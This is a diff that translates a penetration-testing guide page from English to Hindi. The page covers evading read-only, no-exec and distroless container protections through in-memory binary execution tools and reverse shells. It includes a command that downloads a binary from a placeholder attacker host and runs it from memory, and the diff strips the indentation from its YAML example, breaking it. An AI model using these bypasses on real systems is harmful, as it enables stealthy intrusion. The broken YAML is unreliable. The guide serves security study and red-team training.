@@ -1,77 +1,69 @@
-# Bypass FS protections: read-only / no-exec / Distroless
+# FS सुरक्षा को बायपास करें: केवल पढ़ने के लिए / कोई निष्पादन नहीं / डिस्ट्रोलैस
 
 {{#include ../../../banners/hacktricks-training.md}}
 
-<figure><img src="../../../images/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+## वीडियो
 
-If you are interested in **hacking career** and hack the unhackable - **we are hiring!** (_fluent polish written and spoken required_).
+निम्नलिखित वीडियो में आप इस पृष्ठ में उल्लेखित तकनीकों को अधिक गहराई से समझ सकते हैं:
 
-{% embed url="https://www.stmcyber.com/careers" %}
+- [**DEF CON 31 - Linux मेमोरी मैनिपुलेशन का अन्वेषण छिपने और बचने के लिए**](https://www.youtube.com/watch?v=poHirez8jk4)
+- [**DDexec-ng और इन-मेमोरी dlopen() के साथ छिपे हुए घुसपैठ - HackTricks ट्रैक 2023**](https://www.youtube.com/watch?v=VM_gjjiARaU)
 
-## Videos
+## केवल पढ़ने के लिए / कोई निष्पादन नहीं परिदृश्य
 
-In the following videos you can find the techniques mentioned in this page explained more in depth:
-
-- [**DEF CON 31 - Exploring Linux Memory Manipulation for Stealth and Evasion**](https://www.youtube.com/watch?v=poHirez8jk4)
-- [**Stealth intrusions with DDexec-ng & in-memory dlopen() - HackTricks Track 2023**](https://www.youtube.com/watch?v=VM_gjjiARaU)
-
-## read-only / no-exec scenario
-
-It's more and more common to find linux machines mounted with **read-only (ro) file system protection**, specially in containers. This is because to run a container with ro file system is as easy as setting **`readOnlyRootFilesystem: true`** in the `securitycontext`:
+यह अधिक से अधिक सामान्य होता जा रहा है कि लिनक्स मशीनें **केवल पढ़ने के लिए (ro) फ़ाइल प्रणाली सुरक्षा** के साथ माउंट की जाती हैं, विशेष रूप से कंटेनरों में। इसका कारण यह है कि ro फ़ाइल प्रणाली के साथ कंटेनर चलाना **`readOnlyRootFilesystem: true`** को `securitycontext` में सेट करने जितना आसान है:
 
 <pre class="language-yaml"><code class="lang-yaml">apiVersion: v1
 kind: Pod
 metadata:
-  name: alpine-pod
+name: alpine-pod
 spec:
-  containers:
-  - name: alpine
-    image: alpine
-    securityContext:
+containers:
+- name: alpine
+image: alpine
+securityContext:
 <strong>      readOnlyRootFilesystem: true
 </strong>    command: ["sh", "-c", "while true; do sleep 1000; done"]
 </code></pre>
 
-However, even if the file system is mounted as ro, **`/dev/shm`** will still be writable, so it's fake we cannot write anything in the disk. However, this folder will be **mounted with no-exec protection**, so if you download a binary here you **won't be able to execute it**.
+हालांकि, भले ही फ़ाइल प्रणाली को ro के रूप में माउंट किया गया हो, **`/dev/shm`** अभी भी लिखने योग्य होगा, इसलिए यह गलत है कि हम डिस्क में कुछ भी नहीं लिख सकते। हालाँकि, यह फ़ोल्डर **कोई निष्पादन सुरक्षा** के साथ माउंट किया जाएगा, इसलिए यदि आप यहाँ एक बाइनरी डाउनलोड करते हैं तो आप **इसे निष्पादित नहीं कर पाएंगे**।
 
 > [!WARNING]
-> From a red team perspective, this makes **complicated to download and execute** binaries that aren't in the system already (like backdoors o enumerators like `kubectl`).
+> एक रेड टीम के दृष्टिकोण से, यह **बाइनरी डाउनलोड और निष्पादित करना जटिल बनाता है** जो पहले से सिस्टम में नहीं हैं (जैसे बैकडोर या `kubectl` जैसे एन्यूमरेटर)।
 
-## Easiest bypass: Scripts
+## सबसे आसान बायपास: स्क्रिप्ट
 
-Note that I mentioned binaries, you can **execute any script** as long as the interpreter is inside the machine, like a **shell script** if `sh` is present or a **python** **script** if `python` is installed.
+ध्यान दें कि मैंने बाइनरी का उल्लेख किया, आप **किसी भी स्क्रिप्ट को निष्पादित कर सकते हैं** जब तक कि इंटरप्रेटर मशीन के अंदर हो, जैसे कि **शेल स्क्रिप्ट** यदि `sh` मौजूद है या **पायथन** **स्क्रिप्ट** यदि `python` स्थापित है।
 
-However, this isn't just enough to execute your binary backdoor or other binary tools you might need to run.
+हालांकि, यह आपके बाइनरी बैकडोर या अन्य बाइनरी उपकरणों को चलाने के लिए पर्याप्त नहीं है।
 
-## Memory Bypasses
+## मेमोरी बायपास
 
-If you want to execute a binary but the file system isn't allowing that, the best way to do so is by **executing it from memory**, as the **protections doesn't apply in there**.
+यदि आप एक बाइनरी को निष्पादित करना चाहते हैं लेकिन फ़ाइल प्रणाली ऐसा करने की अनुमति नहीं दे रही है, तो ऐसा करने का सबसे अच्छा तरीका है **इसे मेमोरी से निष्पादित करना**, क्योंकि **सुरक्षाएँ वहाँ लागू नहीं होती हैं**।
 
-### FD + exec syscall bypass
+### FD + exec syscall बायपास
 
-If you have some powerful script engines inside the machine, such as **Python**, **Perl**, or **Ruby** you could download the binary to execute from memory, store it in a memory file descriptor (`create_memfd` syscall), which isn't going to be protected by those protections and then call a **`exec` syscall** indicating the **fd as the file to execute**.
+यदि आपके पास मशीन के अंदर कुछ शक्तिशाली स्क्रिप्ट इंजन हैं, जैसे **Python**, **Perl**, या **Ruby**, तो आप मेमोरी से निष्पादित करने के लिए बाइनरी डाउनलोड कर सकते हैं, इसे एक मेमोरी फ़ाइल डिस्क्रिप्टर (`create_memfd` syscall) में स्टोर कर सकते हैं, जो उन सुरक्षा द्वारा संरक्षित नहीं होगा और फिर **`exec` syscall** को कॉल कर सकते हैं जो **fd को निष्पादित करने के लिए फ़ाइल के रूप में इंगित करता है**।
 
-For this you can easily use the project [**fileless-elf-exec**](https://github.com/nnsee/fileless-elf-exec). You can pass it a binary and it will generate a script in the indicated language with the **binary compressed and b64 encoded** with the instructions to **decode and decompress it** in a **fd** created calling `create_memfd` syscall and a call to the **exec** syscall to run it.
+इसके लिए आप आसानी से प्रोजेक्ट [**fileless-elf-exec**](https://github.com/nnsee/fileless-elf-exec) का उपयोग कर सकते हैं। आप इसे एक बाइनरी पास कर सकते हैं और यह निर्दिष्ट भाषा में एक स्क्रिप्ट उत्पन्न करेगा जिसमें **बाइनरी संकुचित और b64 एन्कोडेड** होगी और इसे **डिकोड और अनकंप्रेस** करने के लिए निर्देश होंगे एक **fd** में जो `create_memfd` syscall को कॉल करके बनाया गया है और इसे चलाने के लिए **exec** syscall को कॉल किया गया है।
 
 > [!WARNING]
-> This doesn't work in other scripting languages like PHP or Node because they don't have any d**efault way to call raw syscalls** from a script, so it's not possible to call `create_memfd` to create the **memory fd** to store the binary.
+> यह अन्य स्क्रिप्टिंग भाषाओं जैसे PHP या Node में काम नहीं करता क्योंकि उनके पास स्क्रिप्ट से कच्चे syscalls को कॉल करने का कोई डिफ़ॉल्ट तरीका नहीं है, इसलिए `create_memfd` को कॉल करके **मेमोरी fd** बनाने की संभावना नहीं है।
 >
-> Moreover, creating a **regular fd** with a file in `/dev/shm` won't work, as you won't be allowed to run it because the **no-exec protection** will apply.
+> इसके अलावा, `/dev/shm` में एक फ़ाइल के साथ **नियमित fd** बनाना काम नहीं करेगा, क्योंकि आपको इसे चलाने की अनुमति नहीं होगी क्योंकि **कोई निष्पादन सुरक्षा** लागू होगी।
 
 ### DDexec / EverythingExec
 
-[**DDexec / EverythingExec**](https://github.com/arget13/DDexec) is a technique that allows you to **modify the memory your own process** by overwriting its **`/proc/self/mem`**.
+[**DDexec / EverythingExec**](https://github.com/arget13/DDexec) एक तकनीक है जो आपको **अपने स्वयं के प्रोसेस की मेमोरी को संशोधित करने** की अनुमति देती है, इसके **`/proc/self/mem`** को ओवरराइट करके।
 
-Therefore, **controlling the assembly code** that is being executed by the process, you can write a **shellcode** and "mutate" the process to **execute any arbitrary code**.
+इसलिए, **प्रक्रिया द्वारा निष्पादित असेंबली कोड को नियंत्रित करते हुए**, आप एक **शेलकोड** लिख सकते हैं और प्रक्रिया को **किसी भी मनमाने कोड को निष्पादित करने के लिए "म्यूटेट"** कर सकते हैं।
 
 > [!TIP]
-> **DDexec / EverythingExec** will allow you to load and **execute** your own **shellcode** or **any binary** from **memory**.
-
+> **DDexec / EverythingExec** आपको **मेमोरी** से अपने स्वयं के **शेलकोड** या **किसी भी बाइनरी** को लोड और **निष्पादित** करने की अनुमति देगा।
 ```bash
 # Basic example
 wget -O- https://attacker.com/binary.elf | base64 -w0 | bash ddexec.sh argv0 foo bar
 ```
-
 For more information about this technique check the Github or:
 
 {{#ref}}
@@ -80,45 +72,40 @@ ddexec.md
 
 ### MemExec
 
-[**Memexec**](https://github.com/arget13/memexec) is the natural next step of DDexec. It's a **DDexec shellcode demonised**, so every time that you want to **run a different binary** you don't need to relaunch DDexec, you can just run memexec shellcode via the DDexec technique and then **communicate with this deamon to pass new binaries to load and run**.
+[**Memexec**](https://github.com/arget13/memexec) DDexec का स्वाभाविक अगला कदम है। यह एक **DDexec शेलकोड डेमोनाइज्ड** है, इसलिए हर बार जब आप **एक अलग बाइनरी चलाना चाहते हैं** तो आपको DDexec को फिर से लॉन्च करने की आवश्यकता नहीं है, आप बस DDexec तकनीक के माध्यम से memexec शेलकोड चला सकते हैं और फिर **नए बाइनरी लोड और चलाने के लिए इस डेमोन के साथ संवाद कर सकते हैं**।
 
-You can find an example on how to use **memexec to execute binaries from a PHP reverse shell** in [https://github.com/arget13/memexec/blob/main/a.php](https://github.com/arget13/memexec/blob/main/a.php).
+आप **memexec का उपयोग करके PHP रिवर्स शेल से बाइनरी निष्पादित करने** का एक उदाहरण [https://github.com/arget13/memexec/blob/main/a.php](https://github.com/arget13/memexec/blob/main/a.php) पर पा सकते हैं।
 
 ### Memdlopen
 
-With a similar purpose to DDexec, [**memdlopen**](https://github.com/arget13/memdlopen) technique allows an **easier way to load binaries** in memory to later execute them. It could allow even to load binaries with dependencies.
+DDexec के समान उद्देश्य के साथ, [**memdlopen**](https://github.com/arget13/memdlopen) तकनीक **बाइनरी को मेमोरी में लोड करने का एक आसान तरीका** प्रदान करती है ताकि बाद में उन्हें निष्पादित किया जा सके। यह निर्भरताओं के साथ बाइनरी लोड करने की अनुमति भी दे सकती है।
 
 ## Distroless Bypass
 
 ### What is distroless
 
-Distroless containers contain only the **bare minimum components necessary to run a specific application or service**, such as libraries and runtime dependencies, but exclude larger components like a package manager, shell, or system utilities.
+Distroless कंटेनर केवल **विशिष्ट एप्लिकेशन या सेवा को चलाने के लिए आवश्यक न्यूनतम घटक** होते हैं, जैसे कि पुस्तकालय और रनटाइम निर्भरताएँ, लेकिन पैकेज प्रबंधक, शेल, या सिस्टम उपयोगिताओं जैसे बड़े घटकों को बाहर करते हैं।
 
-The goal of distroless containers is to **reduce the attack surface of containers by eliminating unnecessary components** and minimising the number of vulnerabilities that can be exploited.
+Distroless कंटेनरों का लक्ष्य **अनावश्यक घटकों को समाप्त करके कंटेनरों के हमले की सतह को कम करना** और उन कमजोरियों की संख्या को कम करना है जिन्हें शोषित किया जा सकता है।
 
 ### Reverse Shell
 
-In a distroless container you might **not even find `sh` or `bash`** to get a regular shell. You won't also find binaries such as `ls`, `whoami`, `id`... everything that you usually run in a system.
+एक distroless कंटेनर में आप **शायद `sh` या `bash`** भी नहीं पाएंगे ताकि एक नियमित शेल प्राप्त किया जा सके। आप बाइनरी जैसे `ls`, `whoami`, `id`... भी नहीं पाएंगे... जो कुछ भी आप आमतौर पर एक सिस्टम में चलाते हैं।
 
 > [!WARNING]
-> Therefore, you **won't** be able to get a **reverse shell** or **enumerate** the system as you usually do.
+> इसलिए, आप **रिवर्स शेल** प्राप्त करने या **सिस्टम की गणना** करने में सक्षम **नहीं होंगे** जैसे आप आमतौर पर करते हैं।
 
-However, if the compromised container is running for example a flask web, then python is installed, and therefore you can grab a **Python reverse shell**. If it's running node, you can grab a Node rev shell, and the same with mostly any **scripting language**.
-
-> [!TIP]
-> Using the scripting language you could **enumerate the system** using the language capabilities.
-
-If there is **no `read-only/no-exec`** protections you could abuse your reverse shell to **write in the file system your binaries** and **execute** them.
+हालांकि, यदि समझौता किया गया कंटेनर उदाहरण के लिए एक फ्लास्क वेब चला रहा है, तो फिर पायथन स्थापित है, और इसलिए आप एक **Python रिवर्स शेल** प्राप्त कर सकते हैं। यदि यह नोड चला रहा है, तो आप एक नोड रिव शेल प्राप्त कर सकते हैं, और अधिकांश किसी भी **स्क्रिप्टिंग भाषा** के साथ यही स्थिति है।
 
 > [!TIP]
-> However, in this kind of containers these protections will usually exist, but you could use the **previous memory execution techniques to bypass them**.
+> स्क्रिप्टिंग भाषा का उपयोग करके आप **भाषा की क्षमताओं का उपयोग करके सिस्टम की गणना** कर सकते हैं।
 
-You can find **examples** on how to **exploit some RCE vulnerabilities** to get scripting languages **reverse shells** and execute binaries from memory in [**https://github.com/carlospolop/DistrolessRCE**](https://github.com/carlospolop/DistrolessRCE).
+यदि **कोई `read-only/no-exec`** सुरक्षा नहीं है तो आप अपने रिवर्स शेल का दुरुपयोग करके **फाइल सिस्टम में अपने बाइनरी लिख सकते हैं** और **उन्हें निष्पादित** कर सकते हैं।
 
-<figure><img src="../../../images/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+> [!TIP]
+> हालाँकि, इस प्रकार के कंटेनरों में ये सुरक्षा आमतौर पर मौजूद होंगी, लेकिन आप **उन्हें बायपास करने के लिए पिछले मेमोरी निष्पादन तकनीकों का उपयोग कर सकते हैं**।
 
-If you are interested in **hacking career** and hack the unhackable - **we are hiring!** (_fluent polish written and spoken required_).
+आप **कुछ RCE कमजोरियों का शोषण करने** के लिए **उदाहरण** पा सकते हैं ताकि स्क्रिप्टिंग भाषाएँ **रिवर्स शेल** प्राप्त कर सकें और मेमोरी से बाइनरी निष्पादित कर सकें [**https://github.com/carlospolop/DistrolessRCE**](https://github.com/carlospolop/DistrolessRCE) पर।
 
-{% embed url="https://www.stmcyber.com/careers" %}
 
 {{#include ../../../banners/hacktricks-training.md}}
